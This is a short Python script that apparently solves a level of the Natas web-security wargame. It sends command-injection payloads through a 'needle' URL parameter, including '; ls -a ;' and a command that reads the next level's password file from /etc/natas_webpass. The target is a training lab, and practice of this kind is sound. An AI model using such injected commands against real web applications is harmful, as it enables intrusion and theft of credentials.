import natasX

natas = natasX

# print(natas.natasX(9, "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl").text)
# print(natas.natasX(9, "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl", endpoint="/?needle=; ls -a ;").text)
# print(natas.natasX(9, "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl", endpoint="/?needle=; ls -a cd ..;").text)
print(natas.natasX(9, "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl", endpoint="/?needle=; cat cd ../../../../../etc/natas_webpass/natas10 ;").text)